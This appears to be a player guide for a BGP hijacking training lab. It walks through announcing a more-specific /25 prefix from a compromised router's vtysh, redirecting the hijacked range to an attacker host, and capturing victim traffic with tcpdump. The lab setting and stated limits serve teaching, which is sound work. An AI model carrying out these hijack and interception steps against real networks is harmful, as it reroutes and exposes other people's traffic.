# Playing the lab

You are the attacker. You get one box, the attacker ops host, and you work in-band
from there. No god-mode: you reach what you own, the foothold router and the
looking glass, and nothing else. Each scenario in `scenarios/` gives you an
objective and a win condition; this page is the how, the moves you make and how you
confirm them.

## Getting in

Playing locally, one command makes a cohort key and drops you on the ops host:

```bash
./ctl player
```

If someone runs the lab for you, they hand you a cohort key. Connect straight to
the ops host if you share its network, or jump through the lab host on a public
deployment:

```bash
ssh -i cohort-key player@100.64.0.10                       # local
ssh -i cohort-key -J jump@<lab-host> player@100.64.0.10    # production
```

## On the ops host

Two helpers are all you need to start, alongside the usual recon tools (curl,
tcpdump, traceroute, mtr, dig):

```bash
foothold     # SSH into the compromised router, lands you in its vtysh
lg           # query the looking glass for the global table
```

`foothold` is your only way onto a router, and only the attacker AS accepts it.
`lg` is a public-collector stand-in: a single-transit, read-only vantage, so
confirming a hijack went global is a real lookup, not a peek at anyone's
omniscient table.

## The moves

Everything happens in the foothold router's vtysh. The core one is announcing a
prefix you do not own. It needs a route in the RIB to advertise, so pair the
`network` statement with a discard route:

```
configure terminal
 ip route 203.0.113.0/25 Null0
 router bgp 65020
  address-family ipv4 unicast
   network 203.0.113.0/25
 end
```

A more-specific (a longer prefix, here a /25 inside a /24) wins over the original
by longest-prefix match, whatever the AS path or policy, which is why this takes
the traffic. Withdraw it again the same way:

```
configure terminal
 router bgp 65020
  address-family ipv4 unicast
   no network 203.0.113.0/25
 exit
 no ip route 203.0.113.0/25 Null0
end
```

Other moves the scenarios call for include prepending your AS to lengthen a path,
leaking a route between neighbours, and announcing an exact-match origin. Each
scenario's `attack.md` spells out the sequence it expects.

## Confirming

```bash
lg | grep 203.0.113   # your /25 next to the victim's /24, in a table of real routes
```

The looking glass now carries a sizeable real table (the backbone is seeded with
a live route dump), so filter for your prefix rather than reading the whole thing.
That is the control-plane proof: your announcement reached the wider table. For
the data-plane, see the effect from your own side. In the foothold's vtysh, point
the hijacked range at your ops host instead of discarding it (the `network`
statement still advertises it, since the route is still in the RIB):

```
configure terminal
 ip route 203.0.113.0/25 100.64.0.10
end
```

Then, back on the ops host where your tools are, watch the victim's traffic land:

```bash
tcpdump -ni any host 203.0.113.10
```

The foothold router has only vtysh, no shell, which is the whole point: a router
gives you its routing CLI, and your tooling lives on the ops host. So you drive the
redirect on the router and observe on the box you actually own. You never read the
operator's full table or the victim's machine. You confirm from the looking glass
and from what lands on what you hold, which is how it works for real.

## What this teaches, and what it does not

The control plane is real: the hijack works for the exact reason it works on the
internet, and you confirm it the way you would against RouteViews or RIS. The
backbone now carries a seeded table of real routes, so your prefix wins among
genuine company rather than in an empty RIB, though that table is plausibly large,
not the full million. What the lab does not model yet is a hardened target,
defences to beat (RPKI, prefix filters), or anyone noticing. Do not read "it won
instantly and nobody minded" as how it goes against a real network. Closing that
gap is what the later milestones are for; see `PLAN.md` section 13.
